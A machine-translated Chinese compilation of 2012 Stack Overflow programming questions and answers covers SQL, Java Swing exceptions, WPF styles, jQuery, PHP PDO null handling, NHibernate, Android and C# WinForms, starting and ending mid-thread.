INSERT IGNORE
INTO hashtags(name)
VALUES ('word1'), ('word2'), ('word3'), ('word4'); 
```

您可以获取该单词列表并找到所有（旧的和新的）主题标签：

```
SELECT ht.id
FROM hashtags ht
WHERE ht.name in ('word1', 'word2', 'word3', 'word4') 
```

然后你可以在你的行和主题标签之间插入一个映射：

```
INSERT
INTO hashtag_map (document_id, hashtag_id)
SELECT NEW.document_id, ht.hashtag_id
FROM hashtag ht
WHERE ht.name in ('word1', 'word2', 'word3', 'word4') 
```

# java - 不能在 AbstractAction 中使用 IOException

> ID：13353160
> 
> 赞同：1
> 
> 时间：2012-11-12T23:12:24.127
> 
> 标签：java, swing, export, ioexception

我遇到了一个奇怪的问题。由于在 GUI 中按下按钮，我需要将一些文本导出到文件中。但是，我不能将 IOException 应用于事件调用的 AbstractAction 的 actionPerformed 方法。我不知道如何解决这个问题。

这是导出类：

```
import java.awt.event.*;
import java.lang.*;
import java.util.*;
import java.io.*;

public class ExportRunner
{
  public static void exportToFile(ArrayList<Locker> list) throws IOException
  {

  }
} 
```

和 AbstractAction 扩展：

```
class Export extends AbstractAction
{
  public Export()
  {
    super("Export");
  }
  public void actionPerformed(ActionEvent e)
  {
    ExportRunner.exportToFile(list);
  }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T23:22:07.363

首先，您确定要重新抛出异常还是更好地处理它和/或向用户显示消息？

## 选项1：重新抛出异常（在我看来很难看）：

```
public void actionPerformed(ActionEvent e) {
   try{
      ExportRunner.exportToFile(list);
   } catch(IOException ioex) {
      throw new RuntimeException(ioex);
    }
  } 
```

## 选项2：捕获并处理它：

```
public void actionPerformed(ActionEvent e) {
   try{
      ExportRunner.exportToFile(list);
   } catch(IOException ioex) {
      handleItOrShowMessageToUser(ioex);
    }
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:30:32.477

我通常会将“错误处理程序”传递给操作类，这将允许将处理显示/报告错误的责任委托给应用程序的另一部分......

就像是...

```
public interface ErrorListener {
    public void errorOccurred(String msg, Exception exp);
} 
```

然后你可以将它传递给你的行动......

```
public class Export extends AbstractAction
{
    private ErrorListener errorHandler;
    public Export(ErrorListener errorHandler)
    {
        super("Export");
        this.errorHandler = errorHandler;
    }
    public void actionPerformed(ActionEvent e)
    {
        try {
            ExportRunner.exportToFile(list);
        } catch (IOException exp) {
            errorHandler.errorOccurred("Failed to export file", exp);
        }
    }
} 
```

显然，在某个地方，您需要一个实现来处理回调；）

您可能想查看[异常跟踪](http://docs.oracle.com/javase/tutorial/essential/exceptions/)以获取更多信息

# wpf - DataGrid 样式模板不适用于所有 DataGrid

> ID：13353163
> 
> 赞同：0
> 
> 时间：2012-11-12T23:12:47.180
> 
> 标签：wpf, datagrid, styles

我有一个我试图应用到 DataGrid 的样式，但它只有在我给它一个键并明确说要使用它的情况下才有效。

```
<Application ...>
<Application.Resources>
<Style TargetType="{x:Type Control}" x:Key="ErrorStyle">
    <Setter Property="Validation.ErrorTemplate">
        <Setter.Value>
            <ControlTemplate>
                <DockPanel LastChildFill="True">
                    <TextBlock DockPanel.Dock="Right" 
                        Foreground="Orange"
                        FontSize="12pt">
                        !!!!
                    </TextBlock>
                    <Border BorderBrush="Green" BorderThickness="1">
                        <AdornedElementPlaceholder />
                    </Border>
                </DockPanel>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style>
<Style TargetType="TextBox" BasedOn="{StaticResource ErrorStyle}" />
<Style TargetType="Label" BasedOn="{StaticResource ErrorStyle}" />
<Style TargetType="Button" BasedOn="{StaticResource ErrorStyle}" />
<Style TargetType="DataGrid" BasedOn="{StaticResource ErrorStyle}" />
</Application.Resources>
</Application> 
```

以上适用于我的应用程序中的所有文本框、标签、按钮。但它不适用于 DataGrids。因此，我将 DataGrids 样式更改为：

```
<Style TargetType="DataGrid" BasedOn="{StaticResource ErrorStyle}" x:Key="DataGridErrorStyle" /> 
```

然后像这样显式地将它添加到我的 DataGrids

```
<DataGrid Name="myGrid" Style="{StaticResource ResourceKey=DataGridErrorStyle}" /> 
```

然后一切正常。

我只是想知道是否有人知道为什么 DataGrid 不会使用定义的隐式样式？为什么它需要显式样式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T19:06:08.730

当我尝试它时，我得到了一个带有感叹号的绿色框，无论我为样式显式设置 x:Key 还是仅仅依赖它隐式出现。您的 DataGrid 是否有可能从代码中的其他位置继承了一种样式，该样式覆盖了应用程序的默认样式？

# jquery - jquery将小于选定值的值标记为选中

> ID：13353164
> 
> 赞同：0
> 
> 时间：2012-11-12T23:12:47.087
> 
> 标签：jquery

我有许多价格复选框，我尝试做的是以下

当有人选择价格/复选框时，它会自动检查小于所选值的值。

[提琴手](http://jsfiddle.net/ppw5z/1/)

**HTML**

```
<div class="prices">
    <input type="checkbox" value="59.99" />59.99
    <input type="checkbox" value="69.99" />69.99
    <input type="checkbox" value="79.99" />79.99
    <input type="checkbox" value="89.99" />89.99
    <input type="checkbox" value="99.99" />99.99
    <input type="checkbox" value="124.99" />124.99
    <input type="checkbox" value="149.99" />149.99
    <input type="checkbox" value="199.99" />199.99
    <input type="checkbox" value="200.00" />200.00
</div>
​ 
```

**查询**

```
$('.prices input[type=checkbox]').live('click', function (){
     console.log(this);
     $(this).attr('checked', true);
     var chosenPrice = $(this).val();
     console.log(chosenPrice);
     $(".prices input").filter(function(){ 
     return  $(this).attr("value") <=chosenPrice}).attr('checked', true);
});​ 
```

它选择了一些值，但它似乎没有按应有的方式工作。看看小提琴

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:20:41.377

代码的修改部分。.您只需要在检查当前复选框时检查其他复选框。。还需要使用使用

`parseFloat()`或者`Number()`

```
$('.prices input[type=checkbox]').live('click', function() {
    console.log(this);
    var $this = $(this) ;
    if ($this.is(':checked')) {
        var chosenPrice = $this.val();
        console.log(chosenPrice);
        $(".prices input").filter(function() {
            return parseFloat($(this).attr("value")) <= chosenPrice
        }).prop('checked', true);
    }
});​ 
```

**[检查小提琴](http://jsfiddle.net/sushanth009/ppw5z/7/)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:15:39.697

该脚本正在比较字符串。尝试修改该值以使其成为数字。

```
var chosenPrice = Math.floor($(this).val()); 
```

[http://jsfiddle.net/ppw5z/2/](http://jsfiddle.net/ppw5z/2/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T23:20:29.013

`$(this).val()`返回一个字符串，而不是数字，因此您实际上并没有比较数字。

将您的值转换为浮点数，它应该可以工作：

```
$(document).on('click', '.prices input[type=checkbox]', function() {
    var $this = $(this);
    var value = parseFloat($this.val());

    $this.siblings().andSelf().prop('checked', false).filter(function() {
        return parseFloat($(this).val()) <= value;
    }).prop('checked', true);
});​ 
```

**演示：http: [//jsfiddle.net/ppw5z/6/](http://jsfiddle.net/ppw5z/6/)**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T23:23:09.207

您的代码的问题是正在完成的比较是作为字符串而不是作为浮点数完成的。您可以使用以下代码解决此问题：

```
$('.prices input[type=checkbox]').live('click', function (){
     var chosenPrice = $(this).val();
     $(".prices input").filter(function(){ 
         return parseFloat($(this).val()) <= parseFloat(chosenPrice)).attr('checked', true);
});​ 
```

**演示：** [JSFiddle](http://jsfiddle.net/ppw5z/1/)

# php - 使用 PHP PDO 准备语句和 MySQL 选择字段为空的行

> ID：13353166
> 
> 赞同：15
> 
> 时间：2012-11-12T23:12:48.423
> 
> 标签：php, mysql, pdo, prepared-statement

我一直在将应用程序转换为使用 PDO 准备好的语句而不是 mysqli，我遇到了一个奇怪的问题。我在数据库中有一些记录，预计字段将为空。不是'null'（字符串）或''（空字符串），而是NULL。我动态构建查询，所以过去当我在对象中遇到空变量时，我会像这样构建查询：

```
WHERE fieldName is null; 
```

并且当字段为空时会得到预期的结果。

现在使用 PDO，我的查询没有返回任何结果，也没有收到任何错误。它只是没有返回我期望的记录。当我回显构建的查询并直接在 MySQL 中运行它们时，我得到了预期的结果，但在应用程序中没有返回任何结果。

我尝试过的一些事情包括构建如下所示的查询：

```
WHERE fieldName is null; 
```

或者

```
WHERE fieldName <=> null; 
```

我还尝试了以下标准准备声明：

```
WHERE fieldName = :fieldName 
```

然后与这些类型的语句绑定：

```
$stmt->bindParam(":$field", $value);
$stmt->bindParam(":$field", $value, PDO::PARAM_NULL);
$stmt->bindParam(":$field", null, PDO::PARAM_NULL);
$stmt->bindValue(":$field", null, PDO::PARAM_NULL);
$stmt->bindValue(":$field", null, PDO::PARAM_INT); 
```

对此的任何帮助将不胜感激。我的 PHP 版本是 5.3.10，MySQL 是 5.5.22。作为一个附带问题，我仍然不清楚 bindParam 和 bindValue 之间的区别，所以如果包含在你的答案中是有意义的，我真的很感激对这个主题的一些澄清......

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-12T23:36:58.883

既然写了这个问题，mysql就引入了一个*spaceship算子*，让我们可以使用正则查询来匹配一个空值

```
WHERE fieldName <=> :fieldName; 
```

将匹配一个`null`或任何非空值。

因此，只需立即编写您的查询并像往常一样执行它

```
$stmt = $db->prepare('SELECT field FROM table WHERE fieldName <=> :fieldName;');
$stmt->execute(['fieldName' => null]);
$result = $stmt->fetchAll(); // whatever fetch method is suitable 
```

对于动态构建的查询，一切都是一样的。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-12T23:22:11.343

不同的问题，但所有的遮阳篷都在这里：[如何使用 PDO 插入 NULL 值？](https://stackoverflow.com/questions/1391777/how-do-i-insert-null-values-using-pdo)

把它们加起来：

```
$stmt->bindValue(':param', null, PDO::PARAM_INT); 
```

应该工作。您还可以使用：

```
$stmt->execute( array(":param" => NULL)); 
```

对于 bindparam，您必须在变量（不是常量）中给出值，您可以使用常量等 bindvalue。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-12-30T01:19:30.200

在 MySql 中，您可以使用查询

```
select * from atable where isnull(column_name); 
```

检查空值。

# google-ads-api - Google AdWords API - 报告定义问题

> ID：13353167
> 
> 赞同：4
> 
> 时间：2012-11-12T23:12:50.847
> 
> 标签：google-ads-api

我们正在从 201109 API 升级到 201209 API。201109 可以运行报告并为 Adwords 帐户（包括 MMC）下的任何客户取回数据。

现在，我收到版本 201209 的“CUSTOMER_SERVING_TYPE_REPORT_MISMATCH”错误。[https://developers.google.com/adwords/api/docs/troubleshooting?hl=en#ReportDefinitionError.CUSTOMER_SERVING_TYPE_REPORT_MISMATCH](https://developers.google.com/adwords/api/docs/troubleshooting?hl=en#ReportDefinitionError.CUSTOMER_SERVING_TYPE_REPORT_MISMATCH)

任何人都可以阐明为什么您不能再使用 ReportDefinitionService 为 MMC 帐户下的客户生成报告（以及如何修复）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-06-04T08:41:15.567

即使将 client-customer-id 设置为 MCC Id 时我也遇到了同样的错误，但是当我将其更改为特定 Adwords 帐户的客户端 ID 时，并没有发生此错误。

我认为您无法针对 MCC 中的所有客户帐户生成报告（如果您尝试这样做）。您必须为每个客户帐户生成单独的报告。

希望这会有所帮助：D

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-03T11:49:08.667

您可以从帐户层次结构报告中下载帐户 ID 列表，然后针对每个帐户 ID 运行报告。不幸的是，查询 MCC 不再有效

# cakephp - CakePHP 树行为 - 树与控制器中的线程

> ID：13353169
> 
> 赞同：2
> 
> 时间：2012-11-12T23:12:57.227
> 
> 标签：cakephp, tree, cakephp-2.0, behavior

使用 Cookbook 中的示例：http: [//book.cakephp.org/2.0/en/core-libraries/behaviors/tree.html](http://book.cakephp.org/2.0/en/core-libraries/behaviors/tree.html)

如果你调试（）这个，你会得到一个类别（id => name）的平面数组（）

这对大多数用途来说都很好，但是如果您想基于此创建导航并为 URL 设置一个 slug，而不是 id，那么您就不走运了。

我知道我可以在控制器中使用 $this->Category->find('threaded') 来获取所有字段，但它缺乏平面列表的便利性，因为我必须创建一个递归函数来生成使用链接蛞蝓，正是我希望避免的。

那么在视图中获取我需要的额外 Category.slug 字段的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:53:14.243

CakePHP 的`generateTreeList()`方法允许您选择返回的键和值。例如，如果您希望返回一个以 slug 作为键并以链接文本作为值的列表，则可以使用`$keyPath`and`$valuePath`参数来实现：

```
$data = $this->Category->generateTreeList(null, "{n}.Category.slug", "{n}.Category.text", '_');
debug($data); die; 
```

可能会产生：

```
array(
    ["my-categories"] =>  "My Categories",
    ["fun"] =>  "_Fun",
    ["sport"] =>  "__Sport",
    ["surfing"] =>  "___Surfing",
    ["skating"] => "___Skating",
    ["friends"] =>  "__Friends",
    ["gerald"] =>  "___Gerald",
    ["gwendolyn"] =>  "___Gwendolyn",
    ["work"] =>  "_Work",
    ["trips"] => "__Trips",
    ["national"] => "___National",
    ["international"] => "___International",
    ["other-peoples-categories"] => "Other People's Categories",
    ["extreme-fishing"] =>  "_Extreme fishing"
) 
```

# asp.net-mvc-3 - NHIbernate SessionFactory 和配置重新创建

> ID：13353172
> 
> 赞同：1
> 
> 时间：2012-11-12T23:13:17.370
> 
> 标签：asp.net-mvc-3, nhibernate, castle-windsor, sessionfactory

我有一个困难的情况。

我们知道 NH`SessionFactory`在我们的应用程序中是一个单例。

> “重量级，线程安全，每个数据库只应该有一个”。

并且`SessionFactory`是从`Configuration().BuildSessionFactory()`我`Configuration()`流畅配置​​的数据库创建的。

**这是问题所在。** 我需要在 MVC 应用程序中为我的连接字符串使用不同的用户。这是不同用户连接到数据库所必需的。当连接正常时，我使用 NH 来操作域映射对象。

**这里的问题是** *如何将不同的用户传递给`Configuration`*并使用它`SessionFactory`，以防我们`Configuration`首先需要创建？再次创建`SessionFactory`是错误的方法，对吗？

这*变得更加困难*，因为我在 MVC 应用程序运行之前**使用 Windsor 容器注册所有对象。**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T05:14:20.667

听起来您想为应用程序的不同用户提供不同的连接字符串。

NHibernate 有一个功能，您可以在其中提供自己的 DriverConnectionProvider，这将使您最终能够通过覆盖 GetConnection() 方法即时创建自定义连接字符串。

例子：

```
class DynamicConnectionProvider : DriverConnectionProvider
{
    public override IDbConnection GetConnection()
    {
        IDbConnection connection = Driver.CreateConnection();

        try
        {
            connection.ConnectionString = // Add your logic for dynamically creating a connection string

            connection.Open();
        }
        catch ( Exception e )
        {
            connection.Dispose();

            throw;
        }

        return connection;
    }
} 
```

您还可以查看以下链接以获取示例：

*   [https://stackoverflow.com/a/2927967/670028](https://stackoverflow.com/a/2927967/670028)
*   [http://nhforge.org/blogs/nhibernate/archive/2008/09/18/extending-nhibernate-s-driverconnectionprovider.aspx](http://nhforge.org/blogs/nhibernate/archive/2008/09/18/extending-nhibernate-s-driverconnectionprovider.aspx)

是的，创建重复的 SessionFactories 对您的应用程序内存使用来说会非常昂贵，会使您的应用程序架构复杂化，并且确实没有必要，因为还有其他选项，例如我上面列出的选项。

# google-apps-script - 从模板电子表格复制 Google Apps 脚本

> ID：13353174
> 
> 赞同：1
> 
> 时间：2012-11-12T23:13:26.383
> 
> 标签：google-apps-script

我创建了一个模板电子表格，其中嵌入了 Google Apps 脚本。我称它为“主脚本”。然后我创建了模板的副本，并注意到脚本也被复制为“主脚本副本”。

但是，最近我观察到主脚本没有被复制。Google 是否进行了更改以禁用主脚本的副本？我现在如何才能再次恢复此功能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T04:09:10.050

我不相信有任何变化。我注意到我的一些副本没有正确复制脚本。它给出了某种错误（“副本有问题”或其他东西），当不复制脚本时，这似乎与我的 POV 一致。如果您一直注意到它，我会使用[Google Apps 脚本问题日志打开一个问题](http://code.google.com/p/google-apps-script-issues/issues/list)

# android - android：如何在运行时更改 ListViewItem 背景？（不供选择）

> ID：13353176
> 
> 赞同：0
> 
> 时间：2012-11-12T23:13:28.477
> 
> 标签：android, listview

在我的 android 应用程序中，我需要单独更改 ListView 的每个项目的背景颜色。
我没有找到任何示例或有用的文档。如果 double 的值为 0，背景应该会改变。我设置了 ListView 属性： `android:drawSelectorOnTop="true"` 并使用了以下代码：（
所有的功能，只有背景不会改变！）我该如何解决这个问题？

```
public void onClickButtonOKStand (View view) {
        EditAusgabe = (EditText) findViewById(R.id.EditText01);
        if (EditAusgabe.getText().toString().length() <= 0) {
            Toast T = Toast.makeText(getApplicationContext(), "Eingabe ungültig! Geben Sie einen Betrag ein", Toast.LENGTH_LONG);
            T.show();
            return;
        }
        if (EditAusgabe.getText().toString() == ".") {
            Toast T = Toast.makeText(getApplicationContext(), "Eingabe ungültig! Geben Sie einen Betrag ein", Toast.LENGTH_LONG);
            T.show();
            return;         
        }

        Z = Double.parseDouble(EditAusgabe.getText().toString());

        if (VArt == "Down") {
            if (VStand >= Z) {
                VStand = VStand - Z;
                if (VStand <= 0.39) {
                    Toast T = Toast.makeText(getApplicationContext(), "Ihr Guthaben ist aufgebraucht!", Toast.LENGTH_strong textLONG);
                    T.show();
                    VStand = 0.00;

****************** The next line is my problem: ******************************

StartListe.getChildAt(Position).setBackgroundColor(color.holo_red_light);
                }
            }
            else if (VStand < Z) {
                Toast T = Toast.makeText(getApplicationContext(), "Vorgang nicht möglich! Ihr Konto liegt bei " + FORMAT.format(VStand) + " €.", Toast.LENGTH_LONG);
                T.show();
                EditAusgabe.setText("");
                return;
            } 
        }

        if (VArt == "Up") {
            VStand = VStand + Z;
        }

        Stand.set(Position, FORMAT.format(VStand));
        Liste.set(Position, (VName + "               " + FORMAT.format(VStand) + " € / " + FORMAT.format(VWert) + " €"));
        ListeAktualisieren();
    }

    public void ListeAktualisieren () {
        setContentView(R.layout.activity_ausgabenkontrolle);
        ArrayAdapter<String> ListenAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, Liste);
        StartListe = (ListView) findViewById(R.id.listView1);
        StartListe.setAdapter(ListenAdapter);
        StartListe.setOnItemClickListener(new OnItemClickListener() {

            public void onItemClick(AdapterView<?> ListenAdapter, View view, int i, long ID) {
                // TODO Auto-generated method stub
                Item = view;
                Position = ListenAdapter.getPositionForView(view);
                VName = Namen.get(Position);
                VArt = Arten.get(Position);
                VWert = Double.parseDouble(Werte.get(Position).toString());
                VStand = Double.parseDouble(Stand.get(Position).toString());
                setContentView(R.layout.activity_stand);
                if (VArt == "Down") {
                    if (VStand == 0) {
                    Toast T = Toast.makeText(getApplicationContext(), "Ihr Guthaben ist aufgebraucht!", Toast.LENGTH_LONG);
                    T.show();
                    }
                }
            }
        });
        registerForContextMenu(StartListe);
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:57:24.167

我认为更改背景颜色以响应单击的方法是将更改应用于在 onClickListener 实现中提供给您的传入视图。您似乎在搞乱 setContentViews 等，这不是要走的路。SetContentView 设置您的整体布局，很少有理由在 Activity 中多次调用它。

# java - 通过java bean显示html字符

> ID：13353181
> 
> 赞同：0
> 
> 时间：2012-11-12T23:13:59.063
> 
> 标签：java, html, css, jsp

我有一个从 DB 填充的 java bean。bean 的字段可能包含**<**或 等字符。现在，当我尝试显示它们时，字符串会从出现这些字符的位置截断。

所以如果我有 `this is a </ test message and i want to see if it displays`。HTML 将仅显示`this is a`字符串。我怎样才能显示完整的字符串。

PS：由于某些原因，我无法更改数据库中的字符串。我必须依赖数据库中的任何东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T23:24:10.137

一种选择是用 HTML 标签“pre”包围文本

另一种选择是转义文本以使其对 XML 友好。Commons-lang 对此有一个实用程序。 [http://commons.apache.org/lang/api-release/org/apache/commons/lang3/StringEscapeUtils.html](http://commons.apache.org/lang/api-release/org/apache/commons/lang3/StringEscapeUtils.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:35:58.167

对于一个简单的解决方案，请参阅`String`类的方法：

*   字符串.replace()
*   String.replaceAll()
*   String.replaceFirst()

**注意：** replaceAll 和 replaceFirst 需要一个正则表达式模式来匹配，而不是一个普通的匹配字符串。检查`Pattern`如何构建合适的正则表达式的课程。

请记住，在 HTML 中，符号 < 和 > 可以使用`&lt;`和来显示`&gt;`。如果您不明白我在说什么，只需在此页面上查看源代码并在源代码中找到我的最后一句话。

# c# - 根据全名获取加载的程序集

> ID：13353184
> 
> 赞同：0
> 
> 时间：2012-11-12T23:14:13.560
> 
> 标签：c#, .net, reflection

任何人都知道如何轻松解析加载的程序集并根据全名获取程序集对象？

例如，我的配置有“MyWonderfulApp，Version=1.0.0.0，Culture=neutral，PublicKeyToken=null”，我想知道“Assembly”是什么，这样我就可以将它加载到 MEF 中的 AssemblyCatalog 中。

注意：我知道有不同的加载方式，所以让我们把这些答案排除在外。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T23:21:25.103

您将使用[AssemblyName](http://msdn.microsoft.com/en-us/library/b6ccxba0.aspx)来解析配置文件中的字符串，我猜您将[在应用程序域中加载程序集](http://msdn.microsoft.com/en-us/library/system.appdomain.getassemblies.aspx)并过滤它们，将配置中的程序集名称与程序集的[Assembly.GetName](http://msdn.microsoft.com/en-us/library/y3bk16ya.aspx)方法的结果进行比较。

# android - Android 获取设备在 YZ 平面的角度

> ID：13353185
> 
> 赞同：1
> 
> 时间：2012-11-12T23:14:13.480
> 
> 标签：android, sensors

我试图让设备的角度在 [0, 2π) 的范围内。像这样 ![设备角度](../Images/9c5d595c67cc1fbb070723044ca5cfd8.png) 方向传感器已被弃用，所以我不能使用它。如果我将`SensorManager.getOrientation()`设备保持垂直，则给出以欧拉角为单位的方向，因为欧拉角在 [-π/2, π/2] 的范围内。第 2 和第 3 象限中的点与第 1 和第 4 象限中的点无法区分。所以我不知道我在Y轴的哪一边。

![欧拉角](../Images/db9ffdab18841257ee81886047e4c0b9.png)

我仅限于使用 API 级别 8 (Android 2.2)，所以我只有加速度计和磁场传感器可供使用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T23:36:37.177

试试这个，它可能对你有帮助，，

[我希望这能解决你的问题](http://www.vogella.com/articles/AndroidSensor/article.html)

[http://capycoding.blogspot.in/2012/10/get-angle-from-sensor-in-android.html](http://capycoding.blogspot.in/2012/10/get-angle-from-sensor-in-android.html)

[看这个帖子 1](https://stackoverflow.com/questions/8905000/android-axes-vectors-from-orientation-rotational-angles)

[看这个帖子2](https://stackoverflow.com/questions/9454948/android-pitch-and-roll-issue)

# php - 计算数组中的维数

> ID：13353186
> 
> 赞同：1
> 
> 时间：2012-11-12T23:14:16.597
> 
> 标签：php, multidimensional-array

> **可能重复：**
> [有没有办法找出 PHP 数组有多“深”？](https://stackoverflow.com/questions/262891/is-there-a-way-to-find-how-how-deep-a-php-array-is)

我正在尝试编写一种方法来计算数组的维数。以下给了我正确的尺寸计数

```
$array = array();
$array[0] = array();
$array[0][0] = 0;
$array[0][1] = array();
$array[0][1][0] = 10;
$array[0][1][1] = 11;

echo '<p>'.\utility\arrayTools\arrayTools::numberOfDimensions($array).'</p>';
//3 Dimensons 
```

第二个例子也给了我正确的维度数

```
$array = array();
$array[0] = array();
$array[0][0] = 0;
$array[0][1] = array();
$array[0][1][0] = 10;
$array[0][1][1] = 11;
$array[1] = 1;
$array[2] = 2;
//3 Dimensions 
```

但是下面的例子给我的计数太高了

```
$array = array();
$array[0] = array();
$array[0][0] = 0;
$array[0][1] = array();
$array[0][1][0] = 10;
$array[0][1][1] = 11;
$array[1] = 1;
$array[2] = 2;
$array[3] = array();
$array[3][0] = 30;
//Should still be 3 dimensions, but gives me 4 
```

我使用的方法如下

```
//Method
public static function numberOfDimensions($array)
{
    if(func_num_args() === 2){
        if(is_int(func_get_arg(1))){
            $number_of_dimensions = func_get_arg(1);
        }else{
            throw new Exception('The second argumment must be an interger');
        }
    }else{
        $number_of_dimensions = 0;
    }

    if(is_array($array) === TRUE){
        $number_of_dimensions++;

        if(self::isMultiDimensional($array) === TRUE){
            foreach($array as $iteration){
                $number_of_dimensions = self::numberOfDimensions($iteration,$number_of_dimensions);
            }
            return $number_of_dimensions;
        }else{
            return $number_of_dimensions;
        }
    }else{
        return $number_of_dimensions;
    }
} 
```

我已经知道问题是它仍在为每个多维添加，即使计数可能等于或小于维数。但我想不通的是如何让它找到最大的维度数并停止计数

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:30:25.933

这是`simpler`您的脚本的一个版本

```
function numberOfDimensions($array) {
    $it = new RecursiveIteratorIterator(new RecursiveArrayIterator($array));
    $d = 0;
    foreach ( $it as $v )
        $it->getDepth() >= $d and $d = $it->getDepth();
    return ++ $d;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:31:45.787

好久没写PHP了，可能代码有问题，请见谅。

```
function numberOfDimensions($array,$so_far=0){
    if !is_array($array){
        return 0;
    }
    $max_dims = 0;
    foreach($array as $element){
        $element_dims = numberOfDimensions($array);
        $max_dims = max($max_dims,$element_dims);
    }
    return $max_dims +1;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T23:29:08.777

此函数假定它是使用数组作为参数调用的，因此最小深度为 1。

然后它递归地查看所有子元素，如果子元素比已知的更深，它将子元素的深度添加到计算的深度：

```
function numberOfDimensions($subject) {
    // scalar value has depth 0
    if(!is_array($subject)) return 0;

    // array has min depth of 1
    $depth = 1;
    foreach ($subject as $element) {
        if (is_array($element)) {
            // is the sub array deeper than already known?
            $sub_depth = numberOfDimensions($element);
            if ($sub_depth >= $depth) {
                $depth += $sub_depth;
            }
        }
    }
    return $depth;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T23:29:56.880

从[这里关于 SO 的另一个答案](https://stackoverflow.com/questions/262891/is-there-a-way-to-find-how-how-deep-a-php-array-is)：

```
function array_depth($array) {
    $max_depth = 1;

    foreach ($array as $value) {
        if (is_array($value)) {
            $depth = array_depth($value) + 1;

            if ($depth > $max_depth) {
                $max_depth = $depth;
            }
        }
    }

    return $max_depth;
} 
```

# c# - 在任何组框中单击单选按钮，它会删除以前单击过的组框的单击

> ID：13353187
> 
> 赞同：1
> 
> 时间：2012-11-12T23:14:19.067
> 
> 标签：c#, radio-button, groupbox

我有一个应用程序需要一组可能从 1 到 1000
的问题。这些问题由用户设置，我需要 groupbox 包含下面所示的 2 个单选按钮。该代码确实创建了多个包含 2 个单选按钮的组合框。

此代码处于一个循环中，由需要多少个问题决定。

问题是，当在任何组框中单击单选按钮时，它会删除以前单击过的组框的单击。

我该如何解决这个问题？

```
 GroupBox grpAnswerType = new GroupBox();                                                         // new groupbox
                if (intZ < 9) 
                {
                    grpAnswerType.Name = "grpAnswerType00" + strQNumber;
                }
                if (intZ >= 10 & intZ <= 99)                                                  // intZ is the counter in the loop
                {
                    grpAnswerType.Name = "grpAnswerType0" + strQNumber;                       // name is used later
                }
                if (intZ >= 100 & intZ <= 999)
                {
                    grpAnswerType.Name = "grpAnswerType" + strQNumber;
                }

                grpAnswerType.Location = new Point(290, intR + 20);
                grpAnswerType.Size = new Size(150, 45);
                grpAnswerType.ForeColor = System.Drawing.Color.Red;
                grpAnswerType.BackColor = SystemColors.Control;
                grpAnswerType.Font = font; 
                grpAnswerType.Text = "Choose answer type ";
                this.Controls.Add(grpAnswerType);
                grpAnswerType.Show();
                clsGlobals.gGroupBoxRadioButton3[intZ] = grpAnswerType;                 // add to array for later storage to database  
                pnlQ11.Controls.Add(grpAnswerType);                                     // add to the dynamic panel on the form

                RadioButton rbtnA1 = new RadioButton();                                                                   // Radio Button1  
                if (intZ < 9)
                {
                    rbtnA1.Name = "rbtnA100" + strQNumber;
                }
                if (intZ >= 10 & intZ <= 99)
                {
                    rbtnA1.Name = "rbtnA10" + strQNumber;
                }
                if (intZ >= 100 & intZ <= 999)
                {
                    rbtnA1.Name = "rbtnA1" + strQNumber;
                }

                rbtnA1.Location = new Point(295, intR + 38);
                rbtnA1.Size = new Size(60, 25);
                rbtnA1.Text = "One"; 

                rbtnA1.Font = font;
                rbtnA1.ForeColor = System.Drawing.Color.Blue;
                rbtnA1.BackColor = SystemColors.Control;
                grpAnswerType.Controls.Add(rbtnA1);
                pnlQ11.Controls.Add(rbtnA1);                                                       // if this is not commented, it appears on the panel, if not it does not
                rbtnA1.Show();
                clsGlobals.gRadioButtonOne[intZ] = rbtnA1;
                rbtnA1.BringToFront();

                RadioButton rbtnA2 = new RadioButton();                                                                   // Radio Button 2  
                if (intZ < 9)
                {
                    rbtnA2.Name = "rbtnA200" + strQNumber;
                }
                if (intZ >= 10 & intZ <= 99)
                {
                    rbtnA2.Name = "rbtnA20" + strQNumber;
                }
                if (intZ >= 100 & intZ <= 999)
                {
                    rbtnA2.Name = "rbtnA2" + strQNumber;
                }
                rbtnA2.Location = new Point(355, intR + 38);
                rbtnA2.Size = new Size(70, 25);
                rbtnA2.Text = "All"; ;

                rbtnA2.Font = font;
                rbtnA2.ForeColor = System.Drawing.Color.Blue;
                rbtnA2.BackColor = SystemColors.Control;
                grpAnswerType.Controls.Add(rbtnA2);
                pnlQ11.Controls.Add(rbtnA2);                                                        // if this is not commented, it appears on the panel, if not it does not                    

                rbtnA2.Show();
                clsGlobals.gRadioButtonAll[intZ] = rbtnA2;
                rbtnA2.BringToFront(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T23:29:48.557

